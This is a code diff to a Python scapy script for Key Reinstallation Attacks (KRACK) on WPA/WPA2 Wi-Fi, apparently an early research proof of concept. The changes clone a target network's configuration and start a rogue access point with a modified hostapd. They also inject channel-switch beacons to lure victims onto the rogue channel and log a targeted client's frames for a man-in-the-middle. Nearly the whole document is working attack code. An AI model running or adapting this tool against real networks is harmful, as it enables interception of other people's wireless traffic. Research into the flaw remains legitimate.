@@ -1,15 +1,13 @@
 #!/usr/bin/env python2
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-import sys, os, struct, time, argparse, heapq
+import sys, os, struct, time, argparse, heapq, subprocess, atexit
 from datetime import datetime
 
 # TODO:
 # - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
 # - Option to make a debug pcap capture
-
-CHANNEL_AP    = 1                   # Channel of the original AP
-CHANNEL_CLONE = 11                  # Channel where the original AP will be cloned on
-IFACE_MON     = "wlan2mon"	    # Interface on same channel as the real AP
 
 IEEE_TLV_TYPE_SSID    = 0
 IEEE_TLV_TYPE_CHANNEL = 3
@@ -72,7 +70,8 @@ def get_eapol_msgnum(p):
 			else: return 1
 		else:
 			# sent by server
-			if flags & FLAG_SECURE: return 4
+			keydatalen = struct.unpack(">H", str(p[EAPOL])[97:99])[0]
+			if keydatalen == 0: return 4
 			else: return 2
 
 	return 0
@@ -92,23 +91,23 @@ def dot11_to_str(p):
 		else:                        return repr(p)
 	return repr(p)			
 
-def construct_csa():
+def construct_csa(channel):
 	switch_mode = 1		# STA should not Tx untill switch is completed
-	new_chan_num = 6	# Channel it should switch to -- FIXME do not hardcode this
+	new_chan_num = channel	# Channel it should switch to
 	switch_count = 1	# Immediately make the station switch
 
 	# Contruct the IE
 	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
 	return struct.pack("<BB", IEEE_TLV_TYPE_CSA, len(payload)) + payload
 
-def append_csa(p):
+def append_csa(p, channel):
 	el = p[Dot11Elt]
 	prevel = None
 	while isinstance(el, Dot11Elt):
 		prevel = el
 		el = el.payload
 
-	prevel.payload = construct_csa()
+	prevel.payload = construct_csa(channel)
 
 	return p
 
@@ -136,6 +135,7 @@ def dot11_get_iv(p):
 #### Man-in-the-middle Setup Code ####
 
 def print_rx(level, name, p, color=None, suffix=None):
+	if p[Dot11].type == 1: return
 	if color is None and Dot11Deauth in p: color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
@@ -175,7 +175,7 @@ class NetworkConfig():
 			if el.ID == IEEE_TLV_TYPE_SSID:
 				self.ssid = el.info
 			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
-				self.channel = ord(el.info[0])
+				self.real_channel = ord(el.info[0])
 			elif el.ID == IEEE_TLV_TYPE_RSN:
 				self.parse_wparsn(el.info)
 				self.wpavers |= 2
@@ -186,6 +186,9 @@ class NetworkConfig():
 				self.wmmenabled = 1
 
 			el = el.payload
+
+	def get_rogue_channel(self):
+		return 1 if self.real_channel >= 6 else 11
 
 	def write_config(self, iface):
 		TEMPLATE = """
@@ -207,7 +210,7 @@ wpa_passphrase=XXXXXXXX"""
 		return TEMPLATE.format(
 			iface = iface,
 			ssid = self.ssid,
-			channel = self.channel,
+			channel = self.get_rogue_channel(),
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
@@ -230,12 +233,15 @@ class ClientState():
 
 
 class KRAckAttack():
-	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None):
+	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None):
 		self.nic_real = nic_real
-		self.nic_rogue = nic_rogue
+		self.nic_rogue_ap = nic_rogue_ap
+		self.nic_rogue_mon = nic_rogue_mon
 		self.ssid = ssid
 		self.beacon = None
 		self.apmac = None
+		self.netconfig = None
+		self.hostapd = None
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -252,7 +258,7 @@ class KRAckAttack():
 		self.apmac = self.beacon.addr2
 
 	def send_csa_beacon(self):
-		csabeacon = append_csa(self.beacon)
+		csabeacon = append_csa(self.beacon, self.netconfig.get_rogue_channel())
 		send_dot11(self.sock_real, csabeacon)
 		log(STATUS, "Injected CSA beacon", color="green")
 
@@ -364,6 +370,10 @@ class KRAckAttack():
 				else:
 					send_dot11(self.sock_rogue, p)
 
+		# 3. Always display all frames sent by or to the targeted client
+		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
+			print_rx(INFO, "Rogue channel", p)
+
 
 	def handle_rx_roguechan(self):
 		p = recv_dot11(self.sock_rogue)
@@ -394,6 +404,9 @@ class KRAckAttack():
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if client.forward_frames else None)
+			# Always display all frames sent the targeted client
+			elif p.addr1 == self.clientmac:
+				print_rx(INFO, "Rogue channel", p)
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -434,12 +447,17 @@ class KRAckAttack():
 
 				if client.forward_frames: send_dot11(self.sock_real, p)
 
+		# 3. Always display all frames sent by or to the targeted client
+		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
+			print_rx(INFO, "Rogue channel", p)
+
+
 
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
 		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
-		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue)
+		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
 
 		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
 		self.find_beacon(self.ssid)
@@ -449,20 +467,23 @@ class KRAckAttack():
 		log(STATUS, "Target network detected: " + self.apmac, color="green")
 
 		# Parse beacon and used this to generate a cloned hostapd.conf
-		netconfig = NetworkConfig()
-		netconfig.from_beacon(self.beacon)
-		if not netconfig.is_wparsn():
+		self.netconfig = NetworkConfig()
+		self.netconfig.from_beacon(self.beacon)
+		if not self.netconfig.is_wparsn():
 			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
-			print netconfig.write_config(self.nic_rogue)
 			return
+		elif self.netconfig.real_channel > 13:
+			log(WARNING, "WARNING: Attack not yet tested against 5 GHz networks.")
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		log(ERROR, "TODO: Once modified hostapd is working properly, automatically start it")
-		#with open("hostapd_rogue.conf", "w") as fp:
-		#	fp.write(netconfig.write_config(self.nic_rogue))
+		with open("hostapd_rogue.conf", "w") as fp:
+			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
+		# TODO: Clone the MAC address of the real AP
+		self.hostapd = subprocess.Popen(['../hostapd/hostapd', 'hostapd_rogue.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
 
-		# Inject a CSA beacon to push victims to our channel -- FIXME: dynamic channel
-		self.send_csa_beacon()
+		# Inject a CSA beacon to push victims to our channel
+		for i in range(10): self.send_csa_beacon()
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
 		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
@@ -476,18 +497,34 @@ class KRAckAttack():
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
 
+	def stop(self):
+		log(STATUS, "Closing hostapd ...")
+		if self.hostapd:
+			self.hostapd.kill()
+
+def cleanup():
+	attack.stop()
+
 
 if __name__ == "__main__":
 	# TODO: Optional interface to manually provide a monitor interface for the rogue channel
 	# TODO: Parameter to set debut output level
 	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks (KRAck Attacks)', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
-	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
+	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will run a rogue AP using a modified hostapd.')
 	parser.add_argument('ssid', help='The SSID of the network to attack.')
+	parser.add_argument('--nic_rogue_mon', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
 	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
 	args = parser.parse_args()
 
-	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.ssid, args.clientmac)
+	if args.nic_rogue_mon is None:
+		args.nic_rogue_mon = args.nic_rogue_ap + "mon"
+
+	print args.nic_rogue_mon
+
+	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac)
+
+	atexit.register(cleanup)
 	attack.run()
 
 
